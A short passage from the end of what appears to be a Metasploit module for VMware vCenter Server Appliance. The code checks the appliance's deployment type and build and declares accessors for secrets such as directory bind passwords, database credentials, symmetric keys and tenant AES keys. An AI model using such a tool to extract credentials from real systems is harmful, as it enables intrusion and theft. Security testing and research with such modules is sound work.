    else
      fail_with(Msf::Exploit::Failure::Unknown, "Unable to determine appliance deployment type returned from server: #{vcsa_type}")
    end

    if vcenter_management
      self.vcsa_build = get_vcenter_build
    end

    print_status(vcsa_build)
    print_status(vc_deployment_type)
  end

  private

  attr_accessor :base_dn, :base_fqdn, :bind_dn, :bind_pw, :keystore, :shell_bind_pw, :shell_vcdb_pass, :vc_deployment_type, :vc_psc_fqdn, :vc_sym_key, :vc_sym_key_raw, :vc_tenant_aes_key, :vc_tenant_aes_key_hex, :vc_type_embedded, :vc_type_infrastructure, :vc_type_management, :vcdb_name, :vcdb_pass, :vcdb_user, :vcenter_fqdn, :vcsa_build
end
